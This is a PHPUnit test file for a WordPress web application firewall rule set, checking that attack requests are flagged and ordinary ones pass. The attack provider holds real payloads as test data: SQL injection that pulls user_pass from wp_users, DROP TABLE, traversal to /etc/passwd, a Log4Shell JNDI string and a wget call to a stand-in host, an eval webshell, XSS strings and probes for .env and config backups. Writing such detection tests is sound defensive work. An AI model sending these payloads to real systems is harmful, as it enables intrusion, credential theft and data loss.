<?php
declare(strict_types=1);

namespace Tests\Unit;

use DracoInsomnis\Core\WafRules;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

require_once dirname(__DIR__, 2) . '/src/Core/WafRules.php';

final class WafRulesTest extends TestCase
{
    private const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36';

    /** @return array<string, array{array<string, mixed>, string}> */
    public static function attacks(): array
    {
        return [
            'sqlmap' => [['path' => '/', 'user_agent' => 'sqlmap/1.8#stable (https://sqlmap.org)'], 'scanner'],
            'wpscan' => [['path' => '/', 'user_agent' => 'WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)'], 'scanner'],
            '.env' => [['path' => '/.env'], 'probe'],
            '.env.production' => [['path' => '/app/.env.production'], 'probe'],
            '.git config' => [['path' => '/.git/config'], 'probe'],
            'wp-config backup' => [['path' => '/wp-config.php.bak'], 'probe'],
            'wp-config tilde' => [['path' => '/wp-config.php~'], 'probe'],
            'phpunit rce' => [['path' => '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'], 'probe'],
            'sql dump' => [['path' => '/backup.sql.gz'], 'probe'],
            'debug.log' => [['path' => '/wp-content/debug.log'], 'probe'],
            'webshell' => [['path' => '/wp-content/uploads/alfa-rex.php'], 'probe'],
            'union select' => [['path' => '/', 'query' => 'id=1 UNION ALL SELECT 1,2,user_pass FROM wp_users'], 'sqli'],
            'union comment' => [['path' => '/', 'query' => 'id=1/**/union/**/select/**/1'], 'sqli'],
            'union null' => [['path' => '/', 'query' => "q=' UNION SELECT NULL,NULL-- -"], 'sqli'],
            'union columns' => [['path' => '/', 'query' => 'id=-1 union select user_login,user_pass from wp_users'], 'sqli'],
            'union one column' => [['path' => '/', 'query' => "q=1' UNION SELECT user_pass FROM wp_users-- "], 'sqli'],
            'union one column, plus signs' => [['path' => '/', 'query' => 'id=-1+union+select+user_pass+from+wp_users'], 'sqli'],
            'union one column in a form' => [['path' => '/', 'params' => ["x') union all select user_email from wp_users#"]], 'sqli'],
            'union one column after a number' => [['path' => '/', 'params' => ['5 union select user_pass from wp_users']], 'sqli'],
            'information_schema' => [['path' => '/', 'params' => ['x' => "1' and (select count(*) from information_schema.tables)>0"]], 'sqli'],
            'time based' => [['path' => '/', 'query' => "id=1' AND SLEEP(5)-- -"], 'sqli'],
            'or 1=1' => [['path' => '/', 'params' => ["admin' or '1'='1"]], 'sqli'],
            'drop table' => [['path' => '/', 'params' => ['1; DROP TABLE wp_users']], 'sqli'],
            'traversal' => [['path' => '/', 'query' => 'file=../../../../wp-config.php'], 'traversal'],
            'passwd' => [['path' => '/', 'query' => 'page=/etc/passwd'], 'traversal'],
            'php filter' => [['path' => '/', 'query' => 'f=php://filter/convert.base64-encode/resource=index'], 'traversal'],
            'log4shell' => [['path' => '/', 'user_agent' => '${jndi:ldap://x.example/a}', 'params' => ['${jndi:ldap://x.example/a}']], 'code'],
            'eval' => [['path' => '/', 'params' => ['<?php eval($_POST[1]); ?>']], 'code'],
            'wget' => [['path' => '/', 'query' => 'cmd=wget http://x.example/s.sh'], 'code'],
            'script in url' => [['path' => '/', 'query' => 's=<script>alert(1)</script>'], 'xss'],
            'svg onload' => [['path' => '/', 'query' => 'q=<svg/onload=alert(1)>'], 'xss'],
            'javascript scheme' => [['path' => '/', 'query' => 'redirect=javascript:alert(document.cookie)'], 'xss'],
            'sqli encoded twice' => [['path' => '/', 'query' => 'id=1%27%20union%20select%201,user_pass%20from%20wp_users--%20'], 'sqli'],
            'traversal encoded twice' => [['path' => '/', 'params' => ['%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd']], 'traversal'],
            'script encoded twice' => [['path' => '/', 'query' => 's=%3Cscript%3Ealert(1)%3C/script%3E'], 'xss'],
        ];
    }

    /** @param array<string, mixed> $request */
    #[DataProvider('attacks')]
    public function testAttacksAreCaught(array $request, string $rule): void
    {
        $request['params'] = array_values((array) ($request['params'] ?? []));
        $request['user_agent'] ??= self::UA;
        self::assertSame($rule, WafRules::inspect($request));
    }

    /** @return array<string, array{array<string, mixed>}> */
    public static function ordinary(): array
    {
        return [
            'home' => [['path' => '/']],
            'search select' => [['path' => '/', 'query' => 's=select your product']],
            'search union' => [['path' => '/', 'query' => 's=european union select committee']],
            'percent sign in a search' => [['path' => '/', 'query' => 's=descuento 100%25 & 50%2525']],
            'encoded link in a param' => [['path' => '/', 'params' => ['https%3A%2F%2Fexample.org%2Fa%3Fb%3D1']]],
            'union sentence in a form' => [['path' => '/', 'params' => ['The European Union select committee from Brussels met today.']]],
            'union sentence after a year' => [['path' => '/', 'params' => ['Since 1993 Union select members from all regions.']]],            'utm' => [['path' => '/oferta/', 'query' => 'utm_source=newsletter&utm_campaign=update-2026']],
            'message with sql words' => [['path' => '/wp-json/contact-form-7/v1/contact-forms/7/feedback', 'params' => [
                'Hola, quiero update mi pedido y delete la dirección antigua. Select the blue one, please.',
                'Can you drop the price? I will sleep on it and decide tomorrow.',
                'My username is admin or something like that, 1 = 1 bedroom?',
            ]]],
            'message with html in a form' => [['path' => '/wp-comments-post.php', 'params' => ['Me encanta <strong>esta casa</strong>, onload no sé qué significa']]],
            'relative path in text' => [['path' => '/', 'params' => ['Está en ../fotos/casa.jpg']]],
            'wp-config itself' => [['path' => '/wp-config.php']],
            'normal php' => [['path' => '/wp-login.php', 'query' => 'action=lostpassword']],
            'sql in a post slug' => [['path' => '/blog/how-to-select-from-a-table-in-mysql/']],
            'env word in slug' => [['path' => '/blog/environment-friendly-homes/']],
            'info page' => [['path' => '/info/']],
            'curl in text' => [['path' => '/', 'params' => ['Curl your hair with this product']]],
            'eval word' => [['path' => '/', 'params' => ['Please evaluate (and approve) my request']]],
            'email with javascript word' => [['path' => '/', 'params' => ['I know javascript: React and Vue']]],
        ];
    }

    /** @param array<string, mixed> $request */
    #[DataProvider('ordinary')]
    public function testOrdinaryRequestsPass(array $request): void
    {
        $request['params'] = array_values((array) ($request['params'] ?? []));
        $request['user_agent'] ??= self::UA;
        self::assertNull(WafRules::inspect($request));
    }

    public function testFlatten(): void
    {
        self::assertSame(['a', '1', 'b', 'c', '2'], WafRules::flatten(['a' => 1, 'b' => ['c' => 2]]));
        self::assertCount(3, WafRules::flatten(range(1, 10), 3));
    }
}
